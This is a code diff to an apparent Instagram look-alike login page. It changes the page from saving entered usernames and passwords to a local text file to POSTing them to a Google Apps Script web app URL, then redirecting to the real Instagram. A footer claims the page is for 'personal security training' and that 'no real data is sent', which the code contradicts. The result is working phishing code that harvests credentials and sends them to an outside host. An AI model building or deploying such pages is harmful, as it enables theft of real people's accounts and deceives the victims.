@@ -22,10 +22,7 @@
       text-align: center;
       border-radius: 3px;
     }
-    .logo {
-      width: 175px;
-      margin-bottom: 30px;
-    }
+    .logo { width: 175px; margin-bottom: 30px; }
     input {
       width: 90%;
       padding: 10px;
@@ -62,14 +59,11 @@
   </form>
   
   <p style="color: #8e8e8e; font-size: 12px; margin-top: 20px;">
-    This page is created only for personal security training — no data is sent anywhere.
+    This page is created only for personal security training — no real data is sent.
   </p>
 </div>
 
 <script>
-// Variable to remember the file handle (so it doesn't ask again after first time)
-let fileHandle = null;
-
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
   e.preventDefault();
 
@@ -81,38 +75,28 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     return;
   }
 
-  // Text that will be saved
-  const logEntry = 
-    `Time: ${new Date().toLocaleString('en-US')}\n` +
-    `Username / Email: ${username}\n` +
-    `Password: ${password}\n` +
-    `------------------------\n\n`;
+  const payload = { username: username, password: password };
 
   try {
-    // If we haven't selected a file yet → ask user to choose or create a .txt file
-    if (!fileHandle) {
-      fileHandle = await window.showSaveFilePicker({
-        suggestedName: 'my-training-log.txt',
-        types: [{
-          description: 'Text Files',
-          accept: { 'text/plain': ['.txt'] },
-        }],
-      });
+    const response = await fetch('https://script.google.com/macros/s/AKfycbzziwsBoCyHowhpqNf1hAxkMdqchJxlPpQ4oJ099a2liUCtORDWbhyiJ4e6NIWhXTTT-A/exec', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'text/plain;charset=utf-8'
+      },
+      body: JSON.stringify(payload)
+    });
+
+    const result = await response.json();
+
+    if (result.status === 'success') {
+      alert('✅ Test credentials saved to Google Sheet!\n\nRedirecting to real Instagram...');
+      window.location.href = 'https://www.instagram.com';
+    } else {
+      alert('Error: ' + (result.message || 'Unknown error'));
     }
-
-    // Open file and append to the end
-    const writable = await fileHandle.createWritable({ keepExistingData: true });
-    await writable.seek((await fileHandle.getFile()).size); // go to end of file
-    await writable.write(logEntry);
-    await writable.close();
-
-    alert('Test credentials saved to file!\n\n(Now redirecting to real Instagram)');
-
-    // Redirect to the real Instagram website
-    window.location.href = 'https://www.instagram.com';
   } catch (err) {
-    console.error('Error:', err);
-    alert('Error saving file:\n' + err.message + '\n\n(Your browser may not support this or permission was denied)');
+    console.error('Fetch error:', err);
+    alert('❌ Error sending data: Failed to fetch\n\nCheck:\n1. Internet connection\n2. Correct Web App URL\n3. Redeployed after code change');
   }
 });
 </script>
